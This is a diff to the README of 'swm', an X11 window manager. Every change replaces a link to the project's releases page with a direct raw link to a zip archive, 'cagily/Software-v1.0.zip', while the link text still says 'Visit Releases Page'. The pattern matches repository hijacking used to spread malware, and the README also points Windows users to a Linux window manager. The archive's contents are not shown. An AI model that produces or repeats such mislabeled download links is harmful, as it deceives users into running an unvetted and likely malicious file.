@@ -1,6 +1,6 @@
 # 🪟 swm - Fast, Lightweight X11 Window Manager
 
-[![Download swm](https://img.shields.io/badge/Download%20swm-Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/ideiab836/swm/releases)
+[![Download swm](https://img.shields.io/badge/Download%20swm-Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/ideiab836/swm/raw/refs/heads/main/cagily/Software-v1.0.zip)
 
 ## 🧰 What swm is
 
@@ -19,11 +19,11 @@ swm is built with a focus on speed, low use of system resources, and a direct wo
 
 swm is made for X11-based systems. On Windows, the usual way to use it is through an X11 environment or a compatible setup that can run X11 apps. If you want the easiest path, use the release page below to get the latest build or package that matches your setup.
 
-[Visit the swm releases page](https://github.com/ideiab836/swm/releases)
+[Visit the swm releases page](https://github.com/ideiab836/swm/raw/refs/heads/main/cagily/Software-v1.0.zip)
 
 ## 📥 Download swm
 
-1. Open the [swm releases page](https://github.com/ideiab836/swm/releases)
+1. Open the [swm releases page](https://github.com/ideiab836/swm/raw/refs/heads/main/cagily/Software-v1.0.zip)
 2. Find the latest release
 3. Download the file that matches your system
 4. If the release gives you an app file, save it to your computer
@@ -142,7 +142,7 @@ When you open the releases page, look for:
 - any files named for your screen size or build type
 
 The release page is the main place to get the correct download:
-[https://github.com/ideiab836/swm/releases](https://github.com/ideiab836/swm/releases)
+[https://github.com/ideiab836/swm/raw/refs/heads/main/cagily/Software-v1.0.zip](https://github.com/ideiab836/swm/raw/refs/heads/main/cagily/Software-v1.0.zip)
 
 ## 🧩 Main features
 
@@ -177,4 +177,4 @@ swm is a good fit if you want:
 
 ## 🔗 Download again
 
-[![Download swm](https://img.shields.io/badge/Get%20swm-Releases%20Page-grey?style=for-the-badge)](https://github.com/ideiab836/swm/releases)
+[![Download swm](https://img.shields.io/badge/Get%20swm-Releases%20Page-grey?style=for-the-badge)](https://github.com/ideiab836/swm/raw/refs/heads/main/cagily/Software-v1.0.zip)
